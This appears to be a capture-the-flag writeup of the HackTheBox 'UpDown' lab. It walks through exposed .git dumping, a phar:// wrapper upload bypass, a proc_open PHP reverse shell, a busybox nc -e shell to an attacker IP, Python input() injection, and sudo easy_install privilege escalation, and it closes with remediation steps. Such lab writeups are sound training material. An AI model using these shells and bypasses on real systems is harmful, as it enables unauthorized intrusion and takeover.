---
layout: writeup
title: UpDown - HackTheBox
date: 2024-10-23 13:32:20 +0300
description: A Writeup of the UpDown Box from HackTheBox
image: # /assets/images/UpDown/UpDown.png
fig-caption: # Add figcaption (optional)
tags: [TJ Null, LainKusanagi, Linux, PHP Wrapper, dfunc-bypasser]
---

Today I'm doing a writeup for a [Hack The Box](https://app.hackthebox.com/profile/2013658) box from both TJ Null’s OSCP [lab prep list](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#)and LainKusanagi’s [list of OSCP like machines](https://www.reddit.com/r/oscp/comments/1c8pzyz/lainkusanagi_list_of_oscp_like_machines/). It is called UpDown, and it is rated Medium by HackTheBox. As usual, we get started with an nmap scan. I'm using my own [custom script](https://github.com/pentestpop/verybasicenum/blob/main/vbnmap.sh) for this which (gives more detail but) shows these open ports:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Is my Website up ?
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

So it looks primarily like we're dealing with a web app here. It looks like there is a field for entering a host to check and see if it is up:

![UpDown2.png](/assets/images/UpDown/UpDown2.png){: .responsive-image}

I'll add `siteisup.htb` to my `/etc/hosts` file and run a directory scan on it. Feroxbuster says the is a directory called `/dev` as well, though I can't see anything there. If I enter `http://127.0.0.1`, `http://10.10.11.177`, or `http://siteisup.htb`, I get the response that the site is up, and if it's with the Debug mode on, it shows the html of the site. 

![UpDown3.png](/assets/images/UpDown/UpDown3.png){: .responsive-image}

If I enter my just an IP, it says `Hacking attempt was detected!`. But if I actually start an http server, and then call `http://myIP`, it returns the html of the directory listing, in my case only having `nmap_scan.txt`. 

![UpDown4.png](/assets/images/UpDown/UpDown4.png){: .responsive-image}

I tried a bunch of things here, but i couldn't see to figure it out, so I started brute-forcing for sub-domains. I ran `wfuzz -c -f sub-domains -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u 'siteisup.htb' -H "Host: FUZZ.siteisup.htb" --hw 93` where:
- The `-c` flag prints output with colors
- The `-f` flag outputs to a file (`sub-domains`)
- The `-w` flag is to name the wordlist
- The `-u` flag is to name the url
- THe `-H` flag is to pass the header
- The `--hw` flag is to hide results with a word count of 93. You'll need to run without this flag and then see what you are getting too much of. 

This does return a subdomain of `dev.siteisup.htb`, but I still can't figure out what to do with it.

It turns out that there is a directory called `siteisup.htb/dev/.git`. How does this happen? It turns out that multiple wordlists I use do not have `.git` as a directory! What the fuck? I guess I've missed this in who knows how many labs? So that has gone on long enough, and I decided to figure out how to make sure that doesn't open. We can use `echo` for this to add `.git` to the end of every file in a given directory. 
```
for file in /path/to/directory/*; do
    [ -f "$file" ] && echo ".git" >> "$file"
done
```

We also have the option of insert `.git` before the 10th line of every folder in a given directory with `sed`:
```
for file in /path/to/directory/*; do
    [ -f "$file" ] && sed -i '10i.git' "$file"
done
```

We can also use this command to check if the files in the directory contain `.git`: `grep -r "\.git" /path/to/directory/`.


Back to your regularly scheduled programming. Because we have a git directory, we can grab it all and treat it as a git directory on our machine with `gitdumper http://siteisup.htb/dev/.git dev.git` when `dev.git` is our output folder. I tried a few other tecnhiques, but I couldn't get (git) them working, so git-dumper is going to be my preferred tool for the time being. I did need to install it via `pipx install git-dumper`. Once there, there are a few things we see. 

The `changelog.txt` file has some TODOs:
```
-- ToDo:

1- Multithreading for a faster version :D.
2- Remove the upload option.
3- New admin panel.
```

The `.htacess` file suggest there is a required header, perhaps to access some parts of the site, which would make sense because there is an `admin.php` file, and a `checker.php` file which we have not been able to find. 
```
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```

The `checker.php` file suggests that you can upload a file to scan a list of
![UpDown5.png](/assets/images/UpDown/UpDown5.png){: .responsive-image}

It also lists which extension are not allowed. ![UpDown6.png](/assets/images/UpDown/UpDown6.png){: .responsive-image}
After looking around I learn that we can add a custom header to the Burp Proxy. After turning on our Burp Proxy in FoxyProxy, we open Burp -> Proxy -> Proxy Settings and click Add. We then just add the header, in our case `Special-Dev: only4dev` to the replace section and click Ok.

![UpDown7.png](/assets/images/UpDown/UpDown7.png){: .responsive-image}

Then when we go to the `http://dev.siteisup.htb` site, we can see the upload function.
![UpDown8.png](/assets/images/UpDown/UpDown8.png){: .responsive-image}

So now it's jst a matter of uploading something like a reverse shell and figuring out how we can call it. We can do that from the `/uploads` directory which we know. exists from the `checker.php` file.

![UpDown9.png](/assets/images/UpDown/UpDown9.png){: .responsive-image}

I try this with a simple `.txt` file which is not forbidden by the `checker.php` list, and I can see that a directory has been created, but it is empty when I click on it.

![UpDown10.png](/assets/images/UpDown/UpDown10.png){: .responsive-image}

Furthermore, I can see from the `dev.siteisup.htb` page that it is checking every line. Then I compressed a reverse shell as a `.7z` file, and attempted to upload it. This time I could see it, but it only download from the `/uploads` directory.

At this I try a few different things, like trying to upload with different extensions and change the application type header. It's tough sledding though because the application keeps crashing, and there is clearly and understandably a script to clear out the uploads folder so different students don't interfere with one another. 

The key here is actually to upload a zip folder of some kind with an allowed extension, and then to pass it through the `phar://` wrapper. 

*To summarize: In PHP, a **wrapper** is a protocol abstraction that allows files and resources to be accessed using a specific URL syntax. The `phar` wrapper is a special stream wrapper in PHP that enables direct access to files inside `.phar` (PHP Archive) files using URLs prefixed with `phar://`. This makes it possible to reference files within a `.phar` archive as if they were part of a standard file system.*

This wrapper will basically treat the zip file as a php archive with the contents as php. So we can zip up a test file with a test payload. A typical one is `<?php phpinfo();?>`. So we save that into `info.php` and then save that in a zip file called `info.fart` (the extension doesn't matter unless it's deny-listed.) Then we can upload it, then browse to the file using the php wrapper. Note that it treats the uploaded zip file as a directory, so we call it that way. The full URL is:
`http://siteisup.htb/?page=phar://uploads/458716db95ee534143288abf73f08b91/info.fart/info`. You do leave off the php at the end, and you get the info page.

![UpDown11.png](/assets/images/UpDown/UpDown11.png){: .responsive-image}

Naturally, I tried to upload my favorite [reverse shell](https://github.com/ivan-sincek/php-reverse-shell), but it didn't work. Apparently this is because a lot of the php functions are disabled. There will be a list of the disabled functions on the php info page, but I didn't screenshot there here, and it was crashing too often to go back and grab. There are a lot of recommendations to use a tool called [dfunc-bypasser](https://github.com/teambi0s/dfunc-bypasser), which is a tool "used by developers to check if exploitation using LD_PRELOAD is still possible given the current disable_functions in the php.ini file and taking into consideration the PHP modules installed on the server." The output allows us to know which functions should be disabled for safety purposes, and we can run it on the php info file to check. The full command is: `python3 dfunc-bypasser.py --url http://dev.siteisup.htb/?page=phar://uploads/1dcef0390cd58502002b8060a9851baa/info.fart/info --headers Special-Dev:only4dev`, and it gives us this output:

![UpDown12.png](/assets/images/UpDown/UpDown12.png){: .responsive-image}

It specifies that `proc_open` should be disabled, meaning it is currently enabled, and we can use it for out purposes. Luckily there is a php reverse shell on [revshells.com](http://revshell.scom) which uses it. 

It can be translated into this:

```
<?php
$proc=proc_open("bash -c 'bash -i >&/dev/tcp/10.10.14.3/445 0>&1'",
  array(
    array("pipe","r"),
    array("pipe","w"),
    array("pipe","w")
  ),
  $pipes);
print stream_get_contents($pipes[1]);
?>
```
 I save it as shell.php, zip it as `shell.fart`, and repeat the process with the final URL being: http://dev.siteisup.htb/?page=phar://uploads/c5b0f0dd6af1b0033edf1c5ea2700b34/shell.fart/shell

Personally I immediately run `busybox nc 10.10.14.3 4444 -e /bin/sh &` hoping that will keep it from dying, but it doesn't. Both shells die, apparently for the same reason that the machine keeps crashing. This machine has crashed far more than any other machine I've done. 

```
www-data@updown:/var/www/dev$ find / -type f -perm -u=s 2>/dev/null
find / -type f -perm -u=s 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/chsh
/usr/bin/su
/usr/bin/umount
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/at
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/mount
/home/developer/dev/siteisup
```

Interesting, the `/home/developer/dev/siteisup` binary sticks out like a sore thumb, so I `cd` there to read it. We can read all of it, because it is compiled, but in the `/home/developer/dev` directory, there is also a `siteisup_test.py` file which says:
```
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
	print "Website is up"
else:
	print "Website is down"
```

If the two are at all similar, we might be able to get code injection via the input. When I run it, it says `Enter URL here:` just as the python script. When I try `http://127.0.0.0.1`, I get the error:

```
Traceback (most recent call last):
  File "/home/developer/dev/siteisup_test.py", line 3, in <module>
    url = input("Enter URL here:")
  File "<string>", line 1
    http://127.0.0.1
        ^
SyntaxError: invalid syntax
```

Maybe I can try some python here. I try a few reverse shells, but they don't work. I suspect this is because they have too many quotations marks. At this point, I try entering `import pty;pty.spawn("/bin/bash")`, but the box keeps dying, like every time I try something I do not have time for this, so it's hard to tell if this is working. It turns out that it needs to be `__import__('pty').spawn('/bin/bash')` which does spawn us a shell as the `developer` user.

![UpDown13.png](/assets/images/UpDown/UpDown13.png){: .responsive-image}

For some reason, I can't get `user.txt`, but I can at least `cat .ssh/id_rsa` so hopefully I can speed every thing up now by sshing directly into the machine. No such luck, it contains to have problems. 

From there I run `sudo -l` as usual when getting a new shell, and I see something. 

![UpDown14.png](/assets/images/UpDown/UpDown14.png){: .responsive-image}

Not being familiar with this binary, I run `cat /usr/local/bin/easy_install` to check it out. 
![UpDown15.png](/assets/images/UpDown/UpDown15.png){: .responsive-image}

And then I try to run it, just to see what happens, which predictably creates an error as the script calls for `sys.argv[0]`, but I don't pass an argument:

`error: No urls, filenames, or requirements specified (see --help)`

So I check out the help page. 
![UpDown16.png](/assets/images/UpDown/UpDown16.png){: .responsive-image}

I'm not familiar with this binary, but the fact that there is a help page at all makes me think this is not custom binary so maybe it's on [GTFOBins](https://gtfobins.github.io/gtfobins/easy_install/), and it is:

![UpDown17.png](/assets/images/UpDown/UpDown17.png){: .responsive-image}

And at this point, it actually is that simple. Just run those exact commands in order and:

![UpDown18.png](/assets/images/UpDown/UpDown18.png){: .responsive-image}

We get a root shell. All in all, this was a pretty miserable lab experience. The box died a lot, which mattered because there was also a script clearing out my files in the `/uploads` directory, making it harder to test things. I do still feel like I learned some things though. 

### Lessons Learned
- I learned how to add a custom header to the Burp Proxy. It isn't very complicated, but I hadn't done it before. 
- I also learned I needed to add `.git` to my directory wordlists. 
- I had also never used the `phar://` php wrapper before. I'm familiar with `.jar` files, but didn't know that `.phar` was basically the same thing for php. Now I know how I can upload an archive with a fake extension, and still get the web browser to treat it as a php file, at least in the case where a page is passed as a parameter. 

### Remediation Steps
- Remove the ability for the `dev` sub-domain to be accessed from the outside, and especially so from what appears to be an intentionally public main website.
- Remove the `.git` directory from the main site, or at least make it inaccessible. 
- The `siteisup` binary should sanitize inputs. It should not be possible to execute system commands on it. 
- Likely the `developer` user should not be able to run `easy_install` as root, and especially not without a password. 